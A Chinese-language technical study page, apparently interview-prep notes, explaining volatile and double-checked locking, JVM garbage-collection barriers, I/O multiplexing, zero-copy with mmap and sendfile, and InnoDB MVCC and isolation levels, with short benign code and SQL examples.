<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">static</span> <span class="keyword">volatile</span> Singleton instance;</span><br></pre></td></tr></table></figure>
<p><code>volatile</code> 的语义除了保证可见性，还<strong>禁止指令重排</strong>，这样：</p>
<ul>
<li>JVM 会确保 <strong>对象初始化完成后，才将引用赋值给 instance</strong>；</li>
<li>线程 B 不可能看到未初始化的对象。</li>
</ul>
<h2 id="✅-总结一句话：-5">✅ 总结一句话：</h2>
<blockquote>
<p>JMM 中的指令重排优化会导致“构造对象的顺序”被打乱，从而使得双重检查锁写法在没有 volatile 时<strong>不安全</strong>。</p>
</blockquote>
<p>你可以把 <code>volatile</code> 看作是<strong>并发安全对象初始化中最后的防线</strong></p>
<h2 id="只要-instance-指向了一个地址（即内存已分配），它就不为-null！"><strong>只要</strong> <strong><code>instance</code></strong> <strong>指向了一个地址（即内存已分配），它就不为 null！</strong></h2>
<h2 id="🧠-背后原理（JVM-指令重排序）">🧠 背后原理（JVM 指令重排序）</h2>
<p><code>instance = new Singleton();</code> 并不是原子操作，它可以被分解为三个步骤：</p>
<ol>
<li><strong>memory = allocate()</strong>  // 分配内存空间</li>
<li><strong>ctorInstance(memory)</strong> // 初始化对象（执行构造函数）</li>
<li><strong>instance = memory</strong>  // 把内存地址赋值给 <code>instance</code> 变量</li>
</ol>
<h3 id="⚠️-正常顺序（没被重排）：">⚠️ 正常顺序（没被重排）：</h3>
<ul>
<li>构造函数执行完了 → 再将 <code>instance</code> 设为非 null</li>
<li>线程 B 看 <code>instance != null</code> 是安全的</li>
</ul>
<h3 id="⚠️-被重排序的顺序（不加-volatile-的情况下可能发生）：">⚠️ 被重排序的顺序（不加 volatile 的情况下可能发生）：</h3>
<ol>
<li>分配内存 ✅</li>
<li><code>instance = memory</code> ✅（此时对象没初始化完，但 <code>instance != null</code>）</li>
<li>执行构造函数 ❌（还没开始）</li>
</ol>
<h3 id="⛔-此时线程-B-进来了：">⛔ 此时线程 B 进来了：</h3>
<figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">instance</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 以为对象准备好了，实际上还没构造完成，拿去用了，出错！` `&#125;</span></span><br></pre></td></tr></table></figure>
<p>这就是：</p>
<blockquote>
<p><strong>只要</strong> <strong><code>instance</code></strong> <strong>被赋了一个地址，它就“看起来不为 null”，哪怕这个地址指向的是一个“半成品对象”！</strong></p>
</blockquote>
<h2 id="🧠-一句话总结：">🧠 一句话总结：</h2>
<blockquote>
<p>Java 中对象引用只要指向某块堆内存，就已经“不为 null”了。 但这块内存里的内容可能还没初始化完，<strong>重排序导致你拿到的是“空壳对象”</strong>，这是并发 bug 的根源。</p>
</blockquote>
<h2 id="垃圾回收算法">垃圾回收算法</h2>
<p>通过一个<strong>对象引用在垃圾回收过程中被迁移</strong>的实际场景，详细讲解<strong>读屏障（Read Barrier）</strong> 和 <strong>写屏障（Write Barrier）</strong> 是如何工作的，特别是 ZGC 和 G1 中的典型使用方式。</p>
<h2 id="🎯-场景设定-2">🎯 场景设定</h2>
<p>假设 Java 程序中有以下代码：</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class <span class="keyword">Node</span> <span class="title">&#123; ``    Node</span> next; ``&#125; ` `<span class="keyword">Node</span> <span class="title">a</span> = new <span class="keyword">Node</span><span class="title">();` `Node</span> b = new <span class="keyword">Node</span><span class="title">(); ``a</span>.next = b;</span><br></pre></td></tr></table></figure>
<p>程序正在运行，而此时垃圾回收器开始工作，要将对象从旧内存区域（From Space）迁移到新的区域（To Space）。</p>
<h2 id="🧩-一、没有屏障可能出错的地方">🧩 一、没有屏障可能出错的地方</h2>
<ul>
<li>程序线程还在运行，试图读取 <code>a.next</code>（也就是 <code>b</code>）。</li>
<li>而 GC 正在把 <code>a</code> 和 <code>b</code> 迁移到新内存位置。</li>
<li>如果程序读取了还没迁移好的地址，会访问到无效或错误的内存，导致 <strong>野指针或数据不一致</strong>。</li>
</ul>
<h2 id="🛡️-二、读屏障的工作原理（ZGC）">🛡️ 二、读屏障的工作原理（ZGC）</h2>
<p>ZGC 是典型的 <strong>Load Barrier（加载屏障）</strong> 实现者。</p>
<h3 id="🔧-ZGC-的做法：">🔧 ZGC 的做法：</h3>
<ol>
<li><strong>引用中嵌入标记（染色指针）</strong>：
<ol>
<li>每个引用高位包含标记，比如是否已经被迁移。</li>
</ol>
</li>
<li><strong>读引用时自动修正</strong>：
<ol>
<li>当程序执行 <code>Node temp = a.next</code> 时：
<ul>
<li>屏障逻辑会检查 <code>a</code> 是否被迁移；</li>
<li>如果是，去转发表中查找新地址；</li>
<li>修正引用：把旧地址更新为新地址；</li>
<li>返回新地址的 <code>next</code> 字段。</li>
</ul>
</li>
</ol>
</li>
</ol>
<p>✅ <strong>用户代码感知不到</strong>引用迁移，读到的是“新地址”，这就实现了<strong>并发读+对象迁移的安全共存</strong>。</p>
<h2 id="🛡️-三、写屏障的工作原理（G1）">🛡️ 三、写屏障的工作原理（G1）</h2>
<p>G1 收集器是典型的使用 <strong>写屏障</strong> 来记录修改引用信息的 GC。</p>
<h3 id="🔧-G1-的做法：">🔧 G1 的做法：</h3>
<ol>
<li>程序执行写操作，例如 <code>a.next = b</code>。</li>
<li>写屏障记录“谁修改了引用”：
<ol>
<li><code>a</code> 属于 Old 区，<code>b</code> 属于 Young 区；</li>
<li>G1 会将 <code>a</code> 记录进 Remembered Set（RS），表示 Old 区对象引用了 Young 区对象；</li>
<li>这样 GC 在回收 Young 区时，就知道要额外检查 <code>a</code>，避免遗漏引用。</li>
</ol>
</li>
</ol>
<p>✅ 保证 <strong>跨代引用不丢失</strong>，实现高效的分代回收。</p>
<h2 id="🧪-四、代码-内存行为示意">🧪 四、代码 + 内存行为示意</h2>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// 假设我们写入引用` `a.next = b<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>没有写屏障：</strong>
<ul>
<li>G1 GC 无法知道 Old 区的 <code>a</code> 引用了 Young 区的 <code>b</code>；</li>
<li>当收集 Young 区时，<code>b</code> 会被误清除。</li>
</ul>
</li>
<li><strong>有写屏障：</strong>
<ul>
<li>系统调用写屏障函数，如：</li>
<li>c++</li>
<li>复制编辑</li>
<li><code>writeBarrier(a);</code></li>
<li>将 <code>a</code> 加入到一个卡表（Card Table）或 RS 中；</li>
<li>GC 收集时会遍历这些区域，确保引用不丢。</li>
</ul>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YmQ0YTQ1NzNhNzE2MTYwYTc3MjkzNDhjZDMwNjcxODZfVmFpY2doZk5uUEVGNHFoMk1OMlZTOEtXdG1DUFZ0enBfVG9rZW46Wk13b2JxWVBDb0hsVzl4Y1FMaGM2c1VqbktiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YzYwMWQwMjVkNWIyOTYwZmU5ODc1ZDZhMDE4ZDNjMTRfeWttckxkRlBpV1N3WVFTcHFhU0tXMWMxWWRBTWdneWVfVG9rZW46UDBIUGJnMUxlb01ZNlJ4OFQ1NWN4cW5LbnZmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MzM4MzBhNmZhNWRjY2U0MWUxYzdhZjgzNDI2OTY0ZGRfMWJaTjk1RDZxOVd5OFp6d21yMTY1dnhGNmlnT3NYcjlfVG9rZW46Q1pjd2I0Q0hUb0FSSGp4d2V2MWNQaE5NbmdnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="IO多路复用（epoll、select、poll的区别）">IO多路复用（epoll、select、poll的区别）</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDNmNTE3MGJmNWI1YzE4OWMwZDZlM2M0OWZjYTI5YzVfcG5kQU5QdDRnN09qdVFjQ2ZsWUg1czdCZXRCV29mMEJfVG9rZW46S2cxVWJLTnlLbzJzcHh4aTZ2SWNuMGp3bmFjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>I/O 多路复用（I/O Multiplexing）是一种<strong>在单个线程中同时监听多个文件描述符（FD）是否就绪</strong>的技术，常用于高并发网络编程中。它通过机制如 <code>select</code>、<code>poll</code>、<code>epoll</code> 等实现，在不依赖多线程/多进程的前提下，提高 I/O 效率与系统性能。</p>
<h2 id="🚦-一、为什么需要-I-O-多路复用？">🚦 一、为什么需要 I/O 多路复用？</h2>
<p>传统的阻塞 I/O：</p>
<ul>
<li>每个连接一个线程；</li>
<li>当 I/O 没准备好时会阻塞，线程被挂起；</li>
<li>在高并发下资源浪费严重，线程切换开销大。</li>
</ul>
<p><strong>I/O 多路复用解决了这个问题：</strong></p>
<blockquote>
<p>使用一个线程同时监听多个 I/O 事件，哪个就绪就处理哪个，未就绪的不阻塞！</p>
</blockquote>
<h2 id="🧠-二、I-O-多路复用核心原理">🧠 二、I/O 多路复用核心原理</h2>
<p>核心思想：使用一个线程/进程监听多个 I/O 事件源，一旦某个事件就绪（可读/可写），立即通知应用处理。</p>
<p>比如：</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fd_set fds; <span class="string">``</span>FD_ZERO(&amp;fds); <span class="string">``</span>FD_SET(sockfd, &amp;fds); <span class="string">``</span><span class="keyword">select</span>(sockfd + <span class="number">1</span>, &amp;fds, <span class="built_in">NULL</span>, <span class="built_in">NULL</span>, <span class="built_in">NULL</span>);</span><br></pre></td></tr></table></figure>
<p>如果多个 socket 中某一个可读，则 <code>select</code> 返回，应用只处理就绪的那个，避免轮询或阻塞。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MGVhMTQ5ZDdmNjI5OTZjNzZmN2Q2OWVmNmYyYmU3M2VfcExoWTNENU0xb00zZ1VocmFIMlByTTIwdzdTbkkzQjJfVG9rZW46R0lJN2J3bGxXbzV4V3J4ZGtvN2NWaG1BbnNlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=Yjc2OTZmMTA5ODBlMDhmM2QzMDhiNmJlYTk2MDhlNzBfWm9WeUxZWlhRNWo3Wk5EdGl2UjlJamVTOGx0ZlB2cEFfVG9rZW46VTV0Q2IyTU1nb3Exc294OVAzNmN5aUh5bkJoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="零拷贝（这里的sendfile也可应用于kafka、Netty、Nginx；mmap应用于RocketMQ）">零拷贝（这里的sendfile也可应用于kafka、Netty、Nginx；mmap应用于RocketMQ）</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NjE2ZDlhZWM2ZjBiZjljYzM3YjBjZWNhZDBjNmNhZTRfU0xTejg3ZkV4VngwUGNMdGdHV2k1UkZVWEF5MmpkZkRfVG9rZW46SklGNmJFMkxab0x4aUV4VWF6M2NEcm9DbmpiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="一、传统的IO模式：">一、传统的IO模式：</h3>
<p>传统的IO模式，主要包括 read 和 write 过程：</p>
<ul>
<li>read：把数据从磁盘读取到内核缓冲区，再拷贝到用户缓冲区</li>
<li>write：先把数据写入到 socket缓冲区，最后写入网卡设备</li>
</ul>
<p>流程图如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OTRlNDFkNjFlNzdjNGFiNTljMTk2N2RmMDNjYTgxMmVfWGh1a0dBVExXUWRYRE91MTdaSHpXQWJob051NDc4dGdfVG9rZW46SmVsYmJlWFRzbzJKYU54akZBSGNQQzRRbjA0XzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>（1）用户空间的应用程序通过read()函数，向操作系统发起IO调用，上下文从用户态到切换到内核态，然后再通过 DMA 控制器将数据从磁盘文件中读取到内核缓冲区</p>
<p>（2）接着CPU将内核空间缓冲区的数据拷贝到用户空间的数据缓冲区，然后read系统调用返回，而系统调用的返回又会导致上下文从内核态切换到用户态</p>
<p>（3）用户空间的应用程序通过write()函数向操作系统发起IO调用，上下文再次从用户态切换到内核态；接着CPU将数据从用户缓冲区复制到内核空间的 socket 缓冲区（也是内核缓冲区，只不过是给socket使用），然后write系统调用返回，再次触发上下文切换</p>
<p>（4）最后异步传输socket缓冲区的数据到网卡，也就是说write系统调用的返回并不保证数据被传输到网卡</p>
<p>​        在传统的数据 IO 模式中，读取一个磁盘文件，并发送到远程端的服务，就共有<strong>四次用户空间与内核空间的上下文切换，四次数据复制</strong>，包括两次 CPU 数据复制，两次 DMA 数据复制。但两次 CPU 数据复制才是最消耗资源和时间的，这个过程还需要内核态和用户态之间的来回切换，而CPU资源十分宝贵，要拷贝大量的数据，还要处理大量的任务，如果能把 CPU 的这两次拷贝给去除掉，既能节省CPU资源，还可以避免内核态和用户态之间的切换。而零拷贝技术就是为了解决这个问题</p>
<h3 id="二、什么是零拷贝：">二、什么是零拷贝：</h3>
<p>​        零拷贝指在进行数据 IO 时，数据在用户态下经历了零次 CPU 拷贝，并非不拷贝数据。通过减少数据传输过程中 内核缓冲区和用户进程缓冲区 间不必要的CPU数据拷贝 与 用户态和内核态的上下文切换次数，降低 CPU 在这两方面的开销，释放 CPU 执行其他任务，更有效的利用系统资源，提高传输效率，同时还减少了内存的占用，也提升应用程序的性能。</p>
<p>​        由于零拷贝在内核空间中完成所有的内存拷贝，可以最大化使用 socket 缓冲区的可用空间，从而提高了一次系统调用中处理的数据量，进一步降低了上下文切换次数。零拷贝技术基于 PageCache，而 PageCache 缓存了最近访问过的数据，提升了访问缓存数据的性能，同时，为了解决机械磁盘寻址慢的问题，它还协助 IO 调度算法实现了 IO 合并与预读（这也是顺序读比随机读性能好的原因），这进一步提升了零拷贝的性能。</p>
<h3 id="1、mmap-write-实现的零拷贝：">1、mmap + write 实现的零拷贝：</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MjAzNjkwZDQyZDEyYmZkNjYwYTIwMmJjNmQ1MjI2OThfT0lJRnZKenVsQlpDcGRmZVFnNTNMcjZlaVBBbDEzNkNfVG9rZW46SGJyUWJyTlN3b2Ryd1F4QmJhbGNDOFBMblBkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>（1）用户应用程序通过 mmap() 向操作系统发起 IO调用，上下文从用户态切换到内核态；然后通过 DMA 将数据从磁盘中复制到内核空间缓冲区</p>
<p>（2）mmap 系统调用返回，上下文从内核态切换回用户态（这里不需要将数据从内核空间复制到用户空间，因为用户空间和内核空间共享了这个缓冲区）</p>
<p>（3）用户应用程序通过 write() 向操作系统发起 IO调用，上下文再次从用户态切换到内核态。接着 CPU 将数据从内核空间缓冲区复制到内核空间 socket 缓冲区；write 系统调用返回，导致内核空间到用户空间的上下文切换</p>
<p>（4）DMA 异步将 socket 缓冲区中的数据拷贝到网卡</p>
<p>​        mmap 的零拷贝 I/O 进行了4次用户空间与内核空间的上下文切换，以及3次数据拷贝；其中3次数据拷贝中包括了2次 DMA 拷贝和1次 CPU 拷贝。所以 mmap 通过内存地址映射的方式，节省了数据IO过程中的一次CPU数据拷贝以及一半的内存空间</p>
<h3 id="2、sendfile-实现的零拷贝：">2、sendfile 实现的零拷贝：</h3>
<p>只要我们的代码执行 read 或者 write 这样的系统调用，一定会发生 2 次上下文切换：首先从用户态切换到内核态，当内核执行完任务后，再切换回用户态交由进程代码执行。因此，如果想减少上下文切换次数，就一定要减少系统调用的次数，解决方案就是把 read、write 两次系统调用合并成一次，在内核中完成磁盘与网卡的数据交换。在 Linux 2.1 版本内核开始引入的 sendfile 就是通过这种方式来实现零拷贝的，具体流程图如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NGEyNWYwNjI0MDZmY2ZmYmU3ZDc5MmI1YjQ1OTMxMDBfeFdXUG1OUnI3aDBGOUpNRnhma2x6T3ZuaGtwVmxqaDhfVG9rZW46V2locmJtRHAybzV1emJ4MUlVeGNJVUtZbmdOXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>（1）用户应用程序发出 sendfile 系统调用，上下文从用户态切换到内核态；然后通过 DMA 控制器将数据从磁盘中复制到内核缓冲区中</p>
<p>（2）然后CPU将数据从内核空间缓冲区复制到 socket 缓冲区</p>
<p>（3）sendfile 系统调用返回，上下文从内核态切换到用户态</p>
<p>（4）DMA 异步将内核空间 socket 缓冲区中的数据传递到网卡</p>
<p>​        通过 sendfile 实现的零拷贝I/O使用了2次用户空间与内核空间的上下文切换，以及3次数据的拷贝。其中3次数据拷贝中包括了2次DMA拷贝和1次CPU拷贝。<strong>那能不能将CPU拷贝的次数减少到0次呢？答案肯定是有的，那就是 带 DMA 收集拷贝功能的 sendfile</strong></p>
<h3 id="3、带-DMA-收集拷贝功能的-sendfile-实现的零拷贝：">3、带 DMA 收集拷贝功能的 sendfile 实现的零拷贝：</h3>
<p>Linux 2.4 版本之后，对 sendfile 做了升级优化，引入了 SG-DMA技术，其实就是对DMA拷贝加入了 scatter/gather 操作，它可以直接从内核空间缓冲区中将数据读取到网卡，无需将内核空间缓冲区的数据再复制一份到 socket 缓冲区，从而省去了一次 CPU拷贝。具体流程如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjhjY2Y0YmJhMDM0NzJlOTU1OTNjNmMwMDU0MjAyNzRfWEF4ckI5M0wxR3BwTjdQSGRuaTVlQXN1T0ZBcFpvZW9fVG9rZW46WlRSNmI0b0tYb1pIR0h4c1RCdWNBTzZQbjFnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>（1）用户应用程序发出 sendfile 系统调用，上下文从用户态切换到内核态；然后通过 DMA 控制器将数据从磁盘中复制到内核缓冲区中</p>
<p>（2）接下来不需要CPU将数据复制到 socket 缓冲区，而是将相应的文件描述符信息复制到 socket 缓冲区，该描述符包含了两种的信息：①内核缓冲区的内存地址、②内核缓冲区的偏移量</p>
<p>（3）sendfile 系统调用返回，上下文从内核态切换到用户态</p>
<p>（4）DMA 根据 socket 缓冲区中描述符提供的地址和偏移量直接将内核缓冲区中的数据复制到网卡</p>
<p>​        带有 DMA 收集拷贝功能的 sendfile 实现的 I/O 使用了2次用户空间与内核空间的上下文切换，以及2次数据的拷贝，而且这2次的数据拷贝都是非CPU拷贝，这样就实现了最理想的零拷贝I/O传输了，不需要任何一次的CPU拷贝，以及最少的上下文切换</p>
<p>备注：需要注意的是，零拷贝有一个缺点，就是不允许进程对文件内容作一些加工再发送，比如数据压缩后再发送。</p>
<h3 id="RocketMQ-主要使用的是-mmap-实现零拷贝，而不像-Kafka-那样主要依赖-sendfile"><strong>RocketMQ 主要使用的是</strong> <strong><code>mmap</code></strong> <strong>实现零拷贝</strong>，而不像 Kafka 那样主要依赖 <code>sendfile</code></h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MjMyM2JhZTQyZmEyZDZmNTg3NzY2NjQ5NmI2Nzc5N2FfeGFlSTZJSEt2S1YxYm5BMldlR3F3bVV2SWRPY25YTU1fVG9rZW46RGhjcmJpSjQ1b0p5a2N4d1VNbGNiTnNmbkVkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="✅-面试一语总结（推荐记法）：">✅ 面试一语总结（推荐记法）：</h2>
<blockquote>
<p>RocketMQ 使用 mmap 映射文件，将 CommitLog 映射到内存，写消息时直接写 page cache，读消息时也直接从映射内存读取，从而实现高性能的零拷贝读写流程。与 Kafka 不同，RocketMQ 不依赖 sendfile，而是通过 mmap 和 ByteBuffer 操作减少内存拷贝。</p>
</blockquote>
<h2 id="RR隔离级别下，readview和锁机制如何减少幻读的发生的">RR隔离级别下，readview和锁机制如何减少幻读的发生的</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YTJhZWNhZTRmYzhjYjgzNGM4NjVmYTAzOTIzOGRhNDhfUHhFbVlZeDZIdERROHNnSVpaWEdiZGlwUU10REpxUzZfVG9rZW46RlpOdWJUNHNvbzV1aUJ4YWxjSWNpMFFTblJNXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="✅-事务-A-开启，并进行查询">✅ 事务 A 开启，并进行查询</h3>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-- 事务 A ``BEGIN;` `SELECT * <span class="keyword">FROM</span> orders WHERE amount &gt; 100;` `-- 返回： ``-- <span class="attribute">id</span>=2, <span class="attribute">amount</span>=120 ``-- <span class="attribute">id</span>=3, <span class="attribute">amount</span>=150</span><br></pre></td></tr></table></figure>
<p>此时，事务 A 创建了一个 <code>ReadView</code>，记录了当前活跃事务快照。</p>
<h3 id="✅-事务-B-插入一条满足条件的数据，并提交">✅ 事务 B 插入一条满足条件的数据，并提交</h3>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-- 事务 <span class="keyword">B </span>``<span class="keyword">BEGIN;` </span>`<span class="keyword">INSERT </span>INTO <span class="keyword">orders(user_id, </span>amount) VALUES (<span class="number">104</span>, <span class="number">180</span>)<span class="comment">;` `COMMIT;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>虽然 B 插入的数据满足条件，但事务 A 的 <code>ReadView</code> 早已创建，此插入版本晚于它，不会对事务 A 可见。</p>
</blockquote>
<h3 id="✅-事务-A-再次查询">✅ 事务 A 再次查询</h3>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-- 事务 A 再次执行 ``SELECT * <span class="keyword">FROM</span> orders WHERE amount &gt; 100; ` `-- 返回还是： ``-- <span class="attribute">id</span>=2, <span class="attribute">amount</span>=120 ``-- <span class="attribute">id</span>=3, <span class="attribute">amount</span>=150 ``-- ✅ <span class="attribute">id</span>=4 的新插入记录不可见</span><br></pre></td></tr></table></figure>
<p>📌 这个就是 <strong>MVCC（多版本控制）避免幻读</strong>：返回的结果依赖于开始事务时创建的快照视图，后续插入不会被“看到”。</p>
<h2 id="🔐-场景二：Next-Key-Lock（加锁查询-SELECT-…-FOR-UPDATE）">🔐 场景二：Next-Key Lock（加锁查询 <code>SELECT … FOR UPDATE</code>）</h2>
<p>我们再看一个“<strong>需要加锁场景</strong>”中，InnoDB 如何通过 <strong>Next-Key Lock 防止幻读</strong>。</p>
<h3 id="✅-事务-A-加锁查询：">✅ 事务 A 加锁查询：</h3>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-- 事务 A ``BEGIN;` `<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> orders <span class="keyword">WHERE</span> amount <span class="keyword">BETWEEN</span> <span class="number">100</span> <span class="keyword">AND</span> <span class="number">200</span> <span class="keyword">FOR</span> <span class="keyword">UPDATE</span>;</span><br></pre></td></tr></table></figure>
<p>此时，InnoDB 会加上如下 <strong>Next-Key Locks</strong>：</p>
<ul>
<li>对索引项 <code>amount=100</code> 到 <code>amount=200</code> 范围内的记录加锁；</li>
<li>同时还会对间隙（gap）加锁，比如：
<ul>
<li><code>(-∞, 100)</code> 的 gap 不加锁；</li>
<li><code>(100, 120]</code>, <code>(120, 150]</code>, <code>(150, 200]</code> 的范围都会加锁；</li>
<li><code>amount=180</code> 这个位置也被锁了，即使数据还不存在！</li>
</ul>
</li>
</ul>
<h3 id="✅-事务-B-试图插入一条记录：">✅ 事务 B 试图插入一条记录：</h3>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-- 事务 <span class="keyword">B </span>``<span class="keyword">BEGIN;` </span>`<span class="keyword">INSERT </span>INTO <span class="keyword">orders(user_id, </span>amount) VALUES (<span class="number">105</span>, <span class="number">180</span>)<span class="comment">;` `-- ❗阻塞在这里，直到事务 A 释放锁</span></span><br></pre></td></tr></table></figure>
<p>这是因为 180 处于事务 A 所加的 <code>Next-Key Lock</code> 范围内。</p>
<h3 id="✅-事务-A-提交">✅ 事务 A 提交</h3>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">COMMIT<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>此时 B 插入可以继续执行。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NzljYzliZDI4NTQyNGJiZDgwZDY4NTY4YjBkY2ExZjJfelZsSWJDdmIybk16aUpTYnk2b1k1WjlJWWk5azdYUmJfVG9rZW46UlJldWJWbVd2b2JOTG54UHZLb2NReGtFblljXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="四种隔离级别">四种隔离级别</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MTQ1ODUzNDEyZmVkZjAwMzc0YzRjNjI3NzI1ODhlMWNfY2RlOWZKN3NkSVBqV2hhNlBid09PUm42cUJveDdoRmVfVG9rZW46QnE5WmJGZ0RKb0M5MWx4Y3FFQWNxNUZobm1yXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YTdhNTI5OGNjMzRjYmU3ZDI1YmM3ODYzYjE2NjM0MDNfREQ3cGlLSEU5VzNVMGJZSHgwZjFjR0pwT3JOMFd2NVFfVG9rZW46S2ltMmI3SHZMb0E2RW54VXNVeWM3bXlabkpkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="✅-1-Read-Uncommitted（读未提交）👎最弱">✅ 1. Read Uncommitted（读未提交）👎最弱</h2>
<ul>
<li>✔️ 会发生：<strong>脏读、不可重复读、幻读</strong></li>
<li>🔥 数据不安全，不建议使用</li>
</ul>
<h3 id="🔍-示例：">🔍 示例：</h3>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-- 事务 A： <span class="string">``</span>UPDATE account <span class="built_in">SET</span> balance = <span class="number">5000</span> <span class="keyword">WHERE</span> id = <span class="number">1</span>; -- 未提交 <span class="string">``</span> <span class="string">``</span>-- 事务 B： <span class="string">``</span><span class="keyword">SELECT</span> balance FROM account <span class="keyword">WHERE</span> id = <span class="number">1</span>; -- 读到了 <span class="number">5000</span></span><br></pre></td></tr></table></figure>
<blockquote>
